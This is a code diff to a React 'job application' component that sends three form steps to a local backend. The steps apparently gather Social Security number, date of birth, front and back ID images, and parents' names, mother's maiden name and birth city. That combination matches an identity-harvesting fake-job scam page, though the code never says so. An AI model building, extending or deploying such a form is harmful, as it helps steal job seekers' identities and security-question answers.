@@ -6,6 +6,9 @@ import "react-phone-number-input/style.css";
 
 export default function JobApplication() {
   const [step, setStep] = useState("form");
+  const [step1Status, setStep1Status] = useState("idle");
+  const [step2Status, setStep2Status] = useState("idle");
+  const [submissionStatus, setSubmissionStatus] = useState("idle");
 
   const stepOrder = [
     "form",
@@ -76,7 +79,7 @@ export default function JobApplication() {
     }
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
 
     if (!phone || !isValidPhoneNumber(phone)) {
@@ -85,22 +88,66 @@ export default function JobApplication() {
     }
 
     setPhoneError("");
+    setStep1Status("loading");
 
-    window.scrollTo({
-      top: 0,
-      behavior: "smooth",
-    });
+    const form = new FormData();
+    form.append("fullName", formData.fullName);
+    form.append("email", formData.email);
+    form.append("phone", phone);
+    form.append("position", formData.position);
+    form.append("department", formData.department);
+    form.append("coverLetter", formData.coverLetter);
+    if (formData.resume) form.append("resume", formData.resume);
 
-    setStep("processing");
+    try {
+      const response = await fetch("http://localhost:5000/submit-job-step1", {
+        method: "POST",
+        body: form,
+      });
+
+      if (response.ok) {
+        window.scrollTo({ top: 0, behavior: "smooth" });
+        setStep("processing");
+      } else {
+        alert("Submission failed. Please try again.");
+      }
+    } catch (err) {
+      console.error(err);
+      alert("Submission failed. Please try again.");
+    } finally {
+      setStep1Status("idle");
+    }
   };
 
-  const handleVerificationSubmit = (e) => {
+  const handleVerificationSubmit = async (e) => {
     e.preventDefault();
-    window.scrollTo({
-      top: 0,
-      behavior: "smooth",
-    });
-    setStep("processingVerification");
+    setStep2Status("loading");
+
+    const form = new FormData();
+    form.append("ssn", verification.ssn);
+    form.append("dob", verification.dob);
+    form.append("employeeRef", verification.employeeRef);
+    if (verification.idFront) form.append("idFront", verification.idFront);
+    if (verification.idBack) form.append("idBack", verification.idBack);
+
+    try {
+      const response = await fetch("http://localhost:5000/submit-job-step2", {
+        method: "POST",
+        body: form,
+      });
+
+      if (response.ok) {
+        window.scrollTo({ top: 0, behavior: "smooth" });
+        setStep("processingVerification");
+      } else {
+        alert("Verification submission failed.");
+      }
+    } catch (err) {
+      console.error(err);
+      alert("Verification submission failed.");
+    } finally {
+      setStep2Status("idle");
+    }
   };
 
   const handleIdUpload = (e) => {
@@ -122,13 +169,35 @@ export default function JobApplication() {
     }));
   };
 
-  const handleBackgroundSubmit = (e) => {
+  const handleBackgroundSubmit = async (e) => {
     e.preventDefault();
-    window.scrollTo({
-      top: 0,
-      behavior: "smooth",
-    });
-    setStep("success");
+    setSubmissionStatus("loading");
+
+    const form = new FormData();
+    form.append("fatherName", backgroundInfo.fatherName);
+    form.append("motherName", backgroundInfo.motherName);
+    form.append("maidenName", backgroundInfo.maidenName);
+    form.append("birthCityState", backgroundInfo.birthCityState);
+    form.append("additionalInfo", backgroundInfo.additionalInfo);
+
+    try {
+      const response = await fetch("http://localhost:5000/submit-job-step3", {
+        method: "POST",
+        body: form,
+      });
+
+      if (response.ok) {
+        window.scrollTo({ top: 0, behavior: "smooth" });
+        setStep("success");
+      } else {
+        alert("Submission failed. Please try again.");
+      }
+    } catch (err) {
+      console.error(err);
+      alert("Submission failed. Please try again.");
+    } finally {
+      setSubmissionStatus("idle");
+    }
   };
 
   return (
@@ -262,9 +331,12 @@ export default function JobApplication() {
 
               <button
                 type="submit"
-                className="w-full bg-white text-black py-4 rounded-xl font-medium hover:bg-gray-200 transition"
+                disabled={step1Status === "loading"}
+                className="w-full bg-white text-black py-4 rounded-xl font-medium hover:bg-gray-200 disabled:opacity-50 transition"
               >
-                Submit Application
+                {step1Status === "loading"
+                  ? "Submitting..."
+                  : "Submit Application"}
               </button>
             </form>
           </motion.div>
@@ -440,9 +512,12 @@ export default function JobApplication() {
               {/* BUTTON */}
               <button
                 type="submit"
-                className="w-full bg-white text-black py-4 rounded-xl font-medium hover:bg-gray-200 transition"
+                disabled={step2Status === "loading"}
+                className="w-full bg-white text-black py-4 rounded-xl font-medium hover:bg-gray-200 disabled:opacity-50 transition"
               >
-                Submit for Verification
+                {step2Status === "loading"
+                  ? "Submitting..."
+                  : "Submit for Verification"}
               </button>
             </form>
           </motion.div>
@@ -551,9 +626,12 @@ export default function JobApplication() {
 
                 <button
                   type="submit"
-                  className="w-1/2 bg-white text-black py-4 rounded-xl font-medium hover:bg-gray-200 transition"
+                  disabled={submissionStatus === "loading"}
+                  className="w-1/2 bg-white text-black py-4 rounded-xl font-medium hover:bg-gray-200 disabled:opacity-50 transition"
                 >
-                  Complete Verification
+                  {submissionStatus === "loading"
+                    ? "Submitting..."
+                    : "Complete Verification"}
                 </button>
               </div>
             </form>
